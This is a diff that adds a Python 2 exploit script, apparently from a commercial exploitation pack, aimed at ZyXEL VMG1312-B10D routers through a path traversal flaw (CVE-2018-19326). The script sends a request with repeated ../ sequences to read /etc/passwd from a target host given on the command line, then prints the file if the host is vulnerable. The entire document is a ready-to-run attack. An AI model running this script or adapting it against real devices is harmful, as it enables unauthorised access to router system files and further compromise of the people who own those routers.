@@ -1,0 +1,41 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_zyxel_4'
+_vendor_ = 'zyxel'
+_model_  = ['VMG1312-B10D']
+_vuln_   = 'Path Traversal Vulnerability'
+_cve_    = 'CVE-2018-19326'
+_ref_    = 'https://gist.github.com/numanturle/4988b5583e5ebe501059bd368636de33'
+_port_   = 8080
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/../../../../../../../../../../../../etc/passwd' % (host,port)      
+    response = requests.post(url, allow_redirects=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if 'root:' in response.text:
+    print '[+] %s vulnerable\n' % host
+    print response.text
+  else:
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
